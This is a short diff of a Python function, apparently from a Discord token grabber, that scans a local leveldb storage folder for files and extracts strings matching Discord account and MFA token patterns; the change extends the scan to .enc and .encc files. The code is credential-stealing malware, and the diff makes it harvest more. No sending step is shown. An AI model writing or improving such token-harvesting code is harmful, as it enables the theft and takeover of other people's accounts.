@@ -53,7 +53,7 @@ def getTokenz(path):
     path += "\\Local Storage\\leveldb"
     tokens = []
     for file_name in os.listdir(path):
-        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+        if not file_name.endswith(".log") and not file_name.endswith(".ldb") and not file_name.endswith(".enc") and not file_name.endswith(".encc"):
             continue
         for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
             for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
